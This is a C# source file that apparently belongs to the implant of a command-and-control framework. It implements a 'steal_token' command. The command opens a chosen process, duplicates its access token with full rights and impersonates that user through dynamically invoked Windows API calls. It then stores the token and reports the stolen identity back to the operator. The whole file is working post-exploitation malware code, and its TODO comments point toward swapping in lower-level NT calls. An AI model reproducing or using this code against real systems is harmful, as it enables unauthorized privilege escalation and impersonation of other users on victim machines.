using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Steal_Token : EngineerCommand
    {
        public override string Name => "steal_token";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
				if (!task.Arguments.TryGetValue("/pid", out string pidstring))
				{
					ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Missing pid", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
				pidstring.TrimStart(' ');
				if (!int.TryParse(pidstring, out int pid))
				{
					ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to parse pid", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }

				// open handle to process
				var hProcess = Process.GetProcessById(pid);

                //open handle to token
                // TODO: Replace with NTOpenProcessTokenEx
                if (!h_DynInv_Methods.AdvApi32FuncWrapper.OpenProcessToken(hProcess.Handle, h_DynInv.Win32.Advapi32.TOKEN_ALL_ACCESS, out var hToken))
				{
					ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to open process token", task, EngTaskStatus.Failed,TaskResponseType.String);
                    return;
                }
				//duplicate token
				var sa = new h_DynInv.Win32.WinBase._SECURITY_ATTRIBUTES();
                //TODO: Replace with NTDuplicateToken
                if (!h_DynInv_Methods.AdvApi32FuncWrapper.DuplicateTokenEx(hToken, h_DynInv.Win32.Advapi32.TOKEN_ALL_ACCESS, ref sa, h_DynInv.Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation , h_DynInv.Win32.WinNT.TOKEN_TYPE.TokenImpersonation, out var hTokenDup))
				{
					h_DynInv_Methods.Ker32FuncWrapper.CloseHandle(hToken); // close the open handle we have since we failed duplication.
					hProcess.Dispose();
					ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "failed to duplicate token", task, EngTaskStatus.Failed,TaskResponseType.String);
                    return;
                }

				//impersonate token , just like make token
				if (h_DynInv_Methods.AdvApi32FuncWrapper.ImpersonateLoggedOnUser(hTokenDup))
				{
					var identity = new WindowsIdentity(hTokenDup);
					identity.Impersonate();
					h_DynInv_Methods.Ker32FuncWrapper.CloseHandle(hToken); // can close now that we have successfully impersonated.
					hProcess.Dispose();
					token_store.AddTokenToStore(hTokenDup,pid);
                    Program.ImpersonatedUser = identity;
                    Program.ImpersonatedUserChanged = true;
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Successfully impersonated {identity.Name}", task, EngTaskStatus.Complete,TaskResponseType.String);
                    return;
                }

				//close handle , should get here only if impersonate fails.
				h_DynInv_Methods.Ker32FuncWrapper.CloseHandle(hToken);
				hProcess.Dispose();
				ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "failed to impersonate token", task, EngTaskStatus.Failed,TaskResponseType.String);
			}
            catch (Exception ex)
            {
				ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
		}
    }
}
